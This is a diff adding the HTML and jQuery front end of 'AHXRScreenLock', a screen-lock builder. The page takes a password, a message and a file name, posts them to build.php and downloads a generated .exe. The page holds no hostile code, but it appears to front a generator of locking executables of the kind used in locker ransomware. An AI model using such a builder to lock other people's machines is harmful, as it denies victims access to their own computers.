@@ -1,0 +1,116 @@
+<!--
+	@title
+		AHXRScreenLock
+	@author
+		AHXR (https://github.com/AHXR)
+	@copyright
+		2017
+	AHXRScreenLock is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+    
+	AHXRScreenLock is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+    
+	You should have received a copy of the GNU General Public License
+	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
+    
+//=======================================================
+-->
+<html>
+    <head>
+        <title>AHXRBuilder - Screen Lock Builder</title>
+        
+        <link rel="stylesheet" type="text/css" href="style.css">
+        <script src="https://code.jquery.com/jquery-1.10.2.js"></script>
+    </head>
+    
+    <body>
+        <div id="centerForm">
+            <form>
+                <br />
+                <input id="frmPassword" class="passwordForm" type="text" value="Password" maxlength="16" />
+                <br />
+                <input id="frmMessage" class="messageForm" type="text" value="Message" maxlength="20" />
+                <br />
+                <input id="frmName" class="nameForm" type="text" value="MyLockerFile Name" maxlength="10" />
+                <br />
+                <input id="frmButton" class="buttonForm" type="submit" value="Build" />
+                <input id="frmMask" class="maskForm" type="button" value="Mask" />
+            </form>
+        </div>
+        
+        <script type="text/javascript">
+            var b_pw_init = false;
+            var b_msg_init = false;
+            var b_name_init = false;
+            var b_mask = false;
+        
+            function clearInput( frm ) {
+                $( frm ).val( "" );
+            }
+        
+            // First time input clear.
+            $( "#frmPassword" ).focus( function() {
+                if( !b_pw_init ) {
+                    clearInput( this );
+                    b_pw_init = true;
+                }
+            });
+            
+            $( "#frmMessage" ).focus( function() {
+                if( !b_msg_init ) {
+                    clearInput( this );
+                    b_msg_init = true;
+                }
+            });
+            
+            $( "#frmName" ).focus( function() {
+                if( !b_name_init ) {
+                    clearInput( this );
+                    b_name_init = true;
+                }
+            });
+            
+            // Masking/Unmasking the input.
+            $( "#frmMask" ).click( function() {
+                if( !b_mask )
+                    $( "#frmPassword" ).prop( "type", "password" ); 
+                else
+                    $( "#frmPassword" ).prop( "type", "text" ); 
+                    
+                b_mask = !b_mask;
+            });
+            
+            // Build Button
+            $( "#frmButton" ).click( function() {
+                
+                if( !b_pw_init || !b_msg_init || !b_name_init )
+                    alert( "Please fill out each form." );
+                else {
+                    jQuery.ajax(
+                    {
+                        type: "POST",
+                        url: 'build.php',
+                        dataType: 'json',
+                        data: {
+                            functionname: 'buildFile', 
+                            arguments: [ $( "#frmPassword" ).val(), $( "#frmMessage" ).val(), $( "#frmName" ).val() ]
+                        },
+                    
+                        success: function (obj, textstatus) {
+                            alert( "Your file has been generated. Starting download!" );
+                            window.location.replace( "downloads/" + $( "#frmName" ).val() + ".exe" );
+                        },
+                        error: function (xhr, status, error) {
+                            alert(error);
+                        }
+                    });  
+                }  
+            });
+        </script>
+    </body>
+</html>
